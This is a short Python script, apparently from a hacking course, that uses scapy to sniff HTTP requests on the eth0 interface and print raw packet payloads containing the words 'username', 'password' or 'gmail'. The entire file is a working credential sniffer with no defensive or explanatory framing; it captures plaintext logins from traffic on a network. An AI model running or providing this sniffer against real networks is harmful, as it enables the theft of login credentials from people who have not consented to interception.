#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)   # don't store in memory
    # throw into the prn function every time


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            key_words = ["username", "password", "gmail"]
            for key_word in key_words:
                if key_word in load:
                    print(load)
                    break


sniff("eth0")
# print(packet.show())  # to find the field

